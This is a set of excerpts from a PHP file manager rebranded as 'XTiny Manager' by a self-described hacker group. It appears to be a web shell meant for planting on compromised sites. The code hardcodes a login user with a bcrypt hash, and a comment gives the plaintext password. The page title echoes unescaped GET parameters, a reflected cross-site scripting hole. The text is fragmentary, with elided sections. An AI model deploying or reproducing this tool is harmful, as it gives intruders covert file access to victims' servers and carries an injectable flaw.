...
//Application Title
define('APP_TITLE', '𝑿𝑻𝒊𝒏𝒚 𝑴𝒂𝒏𝒂𝒈𝒆𝒓');
...
$auth_users = array(
    'XList' => '$2a$17$234ulfYaO07iK7x.sT14QO2fFbUjytqGfGXu6ZnFCkUw2bdUjPLFW', //hengker99
);
...
$favicon_path = 'https://hcklst.pages.dev/LogoXList.webp';
                ...
                <div class="row justify-content-md-center align-content-center h-100vh">
                    <div class="card-wrapper">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">XTiny Manager</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3><a href="https://github.com/XList99/she/blob/main/xtiny.php" target="_blank" class="app-v-title"> XList Tiny Manager <?php echo VERSION; ?></a></h3>
                        </p>
                        <p>Author: ./XList</p>
                        <p>Mail Us: <a href="mailto:xposekw@gmail.com">xposekw [at] gmail [dot] com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://github.com/XList99/she" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Explore other tools') ?> </a> </li>
                                <li class="list-group-item"><a href="mailto:xposekw@gmail.com" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if (!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        <?php if (!FM_READONLY): ?>
            ...
            <div class="col-3 d-none d-sm-block"><a href="https://hcklst.pages.dev/" target="_blank" class="float-right text-muted">XList Tiny Manager <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://hcklst.pages.dev/" target="_blank" class="float-right text-muted">XList Tiny Manager <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
?>
    ...
    <head>
        ...
        <meta name="description" content=" hacker Programmers ">
...
?>
    ...
    <head>
        ...
        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "fuck")); ?></title>
        <?php print_external('pre-jsdelivr'); ?>
